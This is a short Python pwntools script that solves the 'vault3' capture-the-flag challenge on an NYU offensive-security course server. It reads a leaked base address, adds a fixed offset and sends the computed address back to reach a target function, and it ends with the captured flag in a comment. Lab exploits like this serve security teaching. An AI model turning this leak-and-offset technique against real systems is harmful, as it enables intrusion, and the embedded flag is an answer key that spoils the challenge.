from pwn import *

# context.log_level = "DEBUG"

CHALLENGE = "vault3"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1233
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

print(p.recvuntil(b": ").decode())
base_addr = p.recv(8)
log.info(f"Receiving address in raw bytes: {base_addr}")
print(p.recvuntil(b"> ").decode())
base_addr = u64(base_addr)
offset = 0x1269
addr = base_addr + offset
p.sendline(hex(addr).encode())
log.info(f"Sending address in base 16: {hex(addr)}")

p.interactive()

# flag{th3_l34st_s1gn1f1c4nt_byt3_c0m3s_f1rst!_1511c380d483ffb6}
